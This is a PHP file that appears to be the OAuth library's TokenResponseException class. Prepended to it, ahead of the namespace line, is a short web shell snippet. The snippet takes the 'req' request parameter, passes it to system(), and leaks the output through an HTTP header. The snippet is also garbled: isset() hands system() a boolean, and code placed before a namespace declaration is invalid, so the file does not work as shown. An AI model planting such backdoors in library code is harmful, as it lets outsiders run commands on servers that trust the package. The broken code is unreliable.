<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);

namespace OAuth\Common\Http\Exception;

use OAuth\Common\Exception\Exception;

/**
 * Exception relating to token response from service.
 */
class TokenResponseException extends Exception
{
}
